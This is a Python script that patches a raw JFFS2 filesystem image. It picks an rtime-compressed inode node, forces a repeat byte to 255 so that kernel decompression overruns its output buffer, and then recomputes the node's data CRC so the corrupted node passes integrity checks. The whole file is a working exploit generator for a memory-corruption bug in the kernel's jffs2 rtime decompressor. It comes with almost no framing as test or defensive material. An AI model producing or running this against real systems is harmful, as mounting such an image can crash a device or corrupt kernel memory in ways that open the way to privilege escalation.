#!/usr/bin/env python3
"""Find an rtime-compressed jffs2_raw_inode data node in a raw jffs2 image
and corrupt its compressed stream so that decompression would write past
`destlen`, while fixing up data_crc so the node still passes CRC checks.

jffs2_raw_inode header layout (packed, little-endian), 68 bytes total:
  0  magic      u16
  2  nodetype   u16   (0xe002 == JFFS2_NODETYPE_INODE)
  4  totlen     u32
  8  hdr_crc    u32
  12 ino        u32
  16 version    u32
  20 mode       u32
  24 uid        u16
  26 gid        u16
  28 isize      u32
  32 atime      u32
  36 mtime      u32
  40 ctime      u32
  44 offset     u32
  48 csize      u32
  52 dsize      u32
  56 compr      u8   (0x02 == JFFS2_COMPR_RTIME)
  57 usercompr  u8
  58 flags      u16
  60 data_crc   u32
  64 node_crc   u32
  68 data[csize]
"""
import struct
import sys
import zlib

MAGIC = 0x1985
NODETYPE_INODE = 0xe002
COMPR_RTIME = 0x02
HDRLEN = 68


def find_inode_nodes(buf):
    nodes = []
    i = 0
    n = len(buf)
    while i + HDRLEN <= n:
        magic, nodetype, totlen, hdr_crc = struct.unpack_from("<HHII", buf, i)
        if magic == MAGIC and nodetype == NODETYPE_INODE and totlen >= HDRLEN:
            nodes.append(i)
            i += (totlen + 3) & ~3
            continue
        i += 4
    return nodes


def rtime_decompress_trace(data_in, destlen):
    """Replicate jffs2_rtime_decompress; return list of (src_pos_of_repeat_byte,
    outpos_before_this_iteration) for every iteration, in order."""
    positions = [0] * 256
    outpos = 0
    pos = 0
    trace = []
    while outpos < destlen:
        value = data_in[pos]
        pos += 1
        repeat_pos = pos
        repeat = data_in[pos]
        pos += 1
        backoffs = positions[value]
        positions[value] = outpos + 1
        trace.append((repeat_pos, outpos))
        outpos += 1
        if repeat:
            if backoffs + repeat >= outpos:
                for _ in range(repeat):
                    data_in_relative = backoffs
                    outpos += 1
                    backoffs += 1
            else:
                outpos += repeat
    return trace


def main():
    path = sys.argv[1]
    with open(path, "rb") as f:
        buf = bytearray(f.read())

    candidates = find_inode_nodes(buf)
    print(f"found {len(candidates)} inode nodes")

    target = None
    for off in candidates:
        (magic, nodetype, totlen, hdr_crc, ino, version, mode, uid, gid,
         isize, atime, mtime, ctime, node_offset, csize, dsize, compr,
         usercompr, flags, data_crc, node_crc) = struct.unpack_from(
            "<HHIIIIIHHIIIIIIIBBHII", buf, off)
        if compr == COMPR_RTIME and csize > 4 and dsize > 8:
            target = off
            print(f"picked node at file-offset 0x{off:x}: ino={ino} ver={version} "
                  f"csize={csize} dsize={dsize} compr={compr}")
            break

    if target is None:
        print("no suitable rtime node found", file=sys.stderr)
        sys.exit(1)

    csize_off = target + 48
    dsize_off = target + 52
    data_crc_off = target + 60
    data_off = target + HDRLEN

    csize = struct.unpack_from("<I", buf, csize_off)[0]
    dsize = struct.unpack_from("<I", buf, dsize_off)[0]
    data = bytes(buf[data_off:data_off + csize])

    trace = rtime_decompress_trace(data, dsize)
    print(f"decompression trace: {len(trace)} (value,repeat) pairs, dsize={dsize}")

    # Pick the last iteration (closest to the end of destlen) and force its
    # repeat byte to 0xff, guaranteeing outpos + repeat > destlen.
    repeat_pos, outpos_before = trace[-1]
    print(f"corrupting repeat byte at data-relative offset {repeat_pos} "
          f"(outpos_before_this_iter={outpos_before}, destlen={dsize})")

    old_repeat = data[repeat_pos]
    new_data = bytearray(data)
    new_data[repeat_pos] = 0xff
    print(f"repeat byte: {old_repeat} -> 255")

    # Splice corrupted data back into the image.
    buf[data_off:data_off + csize] = new_data

    # Recompute data_crc over the modified compressed bytes.
    # NB: the kernel's crc32(0, data, len) is a "raw" CRC32 with seed 0 and no
    # pre/post XOR-invert, unlike zlib.crc32()'s default (seed effectively
    # 0xffffffff with pre+post invert). Reproduce the kernel's convention:
    #   kernel_crc32(data) == zlib.crc32(data, 0xffffffff) ^ 0xffffffff
    new_data_crc = (zlib.crc32(bytes(new_data), 0xffffffff) ^ 0xffffffff) & 0xffffffff
    old_data_crc = struct.unpack_from("<I", buf, data_crc_off)[0]
    struct.pack_into("<I", buf, data_crc_off, new_data_crc)
    print(f"data_crc: 0x{old_data_crc:08x} -> 0x{new_data_crc:08x}")

    with open(path, "wb") as f:
        f.write(buf)
    print("done, image patched in place")


if __name__ == "__main__":
    main()
